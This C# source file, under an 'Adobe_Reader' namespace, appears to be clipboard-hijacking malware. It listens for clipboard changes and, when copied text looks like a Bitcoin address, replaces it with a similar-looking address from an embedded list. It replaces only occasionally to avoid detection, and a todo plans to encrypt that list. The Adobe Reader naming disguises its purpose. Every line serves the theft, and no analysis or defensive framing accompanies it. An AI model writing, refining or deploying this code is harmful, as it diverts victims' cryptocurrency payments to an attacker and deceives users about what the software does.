using System;
using System.Linq;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Adobe_Reader.Properties;

namespace Adobe_Reader
{
    internal partial class BackgroundForm : Form
    {
        private const int OppToMissDef = 3;
        private int _oppToMiss;
        private string _origClpbrdTxt = "";

        internal BackgroundForm()
        {
            InitializeComponent();

            AddClipboardFormatListener(Handle);
        }

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool AddClipboardFormatListener(IntPtr hwnd);

        protected override void WndProc(ref Message m)
        {
            base.WndProc(ref m);

            // if not clipboardchange happened return
            if (m.Msg != 0x031D) return; // 0x031D is the Msg when clipboard changes

            // if clipboard doesnt contain text return
            if (!Clipboard.ContainsText()) return;

            var clpbrd = Clipboard.GetText();

            // todo vanityAddresses encryption and compression
            // if clpbrd is already among the addresses return
            if (
                Resources.vanityAddresses.Split(new[] {Environment.NewLine}, StringSplitOptions.RemoveEmptyEntries)
                    .ToList()
                    .Contains(clpbrd)) return;

            // if this is the second time the user copied, do not force it, return
            if (clpbrd == _origClpbrdTxt) return;
            _origClpbrdTxt = clpbrd;

            // if clpbrd probably not btc address return
            if (!Tools.ProbablyBtcAddress(clpbrd)) return;

#if !DEBUG
            // don't replace too often
            if (_oppToMiss > 0)
            {
                _oppToMiss--;
                return;
            }
            _oppToMiss = OppToMissDef;
#endif

            // find and set the most similar btc address
            Tools.SetMostSimilarBtcAddress(clpbrd);
        }
    }
}